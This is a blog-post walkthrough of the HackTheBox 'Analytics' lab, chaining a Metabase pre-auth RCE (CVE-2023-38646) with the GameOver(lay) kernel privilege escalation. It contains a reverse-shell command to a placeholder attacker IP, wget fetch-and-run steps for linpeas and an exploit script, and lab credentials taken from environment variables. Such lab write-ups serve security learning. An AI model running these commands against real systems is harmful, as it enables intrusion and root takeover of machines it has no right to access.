---
layout: post
title: 'Analytics - HackTheBox Walkthrough'
date: 2026-03-10 18:28:48 +0000
categories: [cybersecurity]
tags:
  - hackthebox
  - writeup
description: "Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE"
canonical_url: "https://medium.com/@hemanthakrishnach/analytics-hackthebox-walkthrough-933c49004220"
image: "/assets/images/posts/analytics-hackthebox-walkthrough/img-000-8411ea21.png"
---

Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE

---

### Analytics — HackTheBox Walkthrough

Pwning Metabase with Pre-Auth RCE and GameOver(lay) LPE![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-000-8411ea21.png)

Room Link: <https://app.hackthebox.com/machines/Analytics>

### Introduction

Analytics is an Easy-rated HackTheBox Linux machine that chains together two well-known vulnerabilities: a pre-authentication remote code execution bug in Metabase (CVE-2023–38646) and a local privilege escalation via the GameOver(lay) OverlayFS kernel exploit (CVE-2023–2640 / CVE-2023–32629). The foothold requires almost no credentials — just an exposed setup token, while the privilege escalation is a single-script affair. Let’s walk through it.

### Reconnaissance

We kick things off with an Nmap scan:
```xml
nmap -sC -sV <MACHINE_IP>
```
![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-001-a67e80be.png)

The results reveal two open ports:

- **22/tcp** — OpenSSH 8.9p1 (Ubuntu 22.04)- **80/tcp** — nginx 1.18.0, with an HTTP title of “Analytical”

The web server is running nginx and the site is titled “Analytical,” which immediately hints at a data analytics platform.

### Virtual Host Enumeration

Navigating to `http://analytical.htb` shows a corporate landing page. We add both virtual hosts to `/etc/hosts`:![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-002-a36cb83d.png)
```kotlin
10.129.229.224  analytical.htb10.129.229.224  data.analytical.htb
```

The subdomain `data.analytical.htb` reveals a **Metabase** login page. Viewing the page source exposes the version string:
```json
"version":"v0.46.6","tag":"release-x.46.x"
```
![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-003-f8cff480.png)

This is a critical detail — Metabase v0.46.6 is vulnerable to [**CVE-2023–38646**](https://github.com/m3m0o/metabase-pre-auth-rce-poc), a pre-authentication Remote Code Execution vulnerability.

### Foothold — Metabase Pre-Auth RCE (CVE-2023–38646)

### Finding the Setup Token

Metabase exposes an unauthenticated API endpoint at `/api/session/properties`. Navigating there and searching for `setup-token` reveals the token in plaintext:
```json
"setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"
```
![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-004-85344ebc.png)

This token is the key to the exploit — it’s only supposed to be active during the initial setup process but remains exposed on unpatched instances.

### Exploiting the RCE

We use the PoC from [m3m0o’s GitHub repository](https://github.com/m3m0o/metabase-pre-auth-rce-poc). Set up a netcat listener first:
```bash
nc -lvnp 4444
```

Then fire the exploit:
```cpp
python3 main.py \  -u http://data.analytical.htb \  -t <YOUR_SETUP_TOKEN>\  -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

We receive a reverse shell as user `metabase` inside what appears to be a Docker container.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-005-18fa5306.png)![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-006-df9fd494.png)

### Lateral Movement — Credentials in Environment Variables

Once inside the container, running `env` dumps the environment variables. Among them:![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-007-3c802a61.png)
```ini
META_USER=metalyticsMETA_PASS=An4lytics_ds20223#
```

These are plaintext credentials stored in the container’s environment. We use them to SSH directly into the host machine:
```kotlin
ssh metalytics@<MACHINE_IP>
```

We’re greeted with an Ubuntu 22.04 shell as `metalytics` and can grab the **user flag** from `~/user.txt`.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-008-618772fb.png)![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-009-d8ab4b61.png)

### Privilege Escalation — GameOver(lay) (CVE-2023–2640 / CVE-2023–32629)

### Identifying the Attack Surface

We spin up a Python HTTP server in the directory where our tools live:
```bash
# Attacker — serve files from ~/transferscd ~/transferspython3 -m http.server 80
```

On the target, we pull down `linux-exploit-suggester.sh` and run it:
```bash
# Targetcd /tmpwget http://<ATTACKER_IP>/linpeas.shwget http://<ATTACKER_IP>/linux-exploit-suggester.shchmod +x linpeas.sh linux-exploit-suggester.sh./linux-exploit-suggester.sh
```

Running `linux-exploit-suggester.sh` on the target highlights **CVE-2023-0386** (OverlayFS suid smuggle) as a candidate. A bit more research leads us to the related **GameOver(lay)** vulnerability chain — CVE-2023-2640 and CVE-2023-32629 — which affects Ubuntu kernels up to 6.2.x.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-010-35e150dc.png)

The target’s kernel is **6.2.0** on Ubuntu **22.04**, making it a perfect fit.

### Exploiting GameOver(lay)

The exploit is a single shell script, available at:
```bash
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh
```

We place it in our transfer directory and fetch it on the target using the same Python HTTP server that’s already running:
```bash
# Targetwget http://<ATTACKER_IP>/exploit.shchmod +x exploit.sh./exploit.sh
```

The script outputs:
```python
[+] You should be root now[+] Type 'exit' to finish and leave the house cleaned
```

Running `whoami` confirms: **root**.

We navigate to `/root` and read `root.txt` to complete the machine.![image](/assets/images/posts/analytics-hackthebox-walkthrough/img-011-ea068623.png)

### Key Takeaways

- Always check for exposed API endpoints leaking tokens or version information before attempting bruteforce or more complex attacks.- Environment variables on containers are a goldmine for credentials — always run `env` after obtaining a shell.- `linux-exploit-suggester` is your friend for kernel LPE paths on older Ubuntu kernels.

#### *If you found this walkthrough helpful, feel free to give it a clap! Happy hacking.*
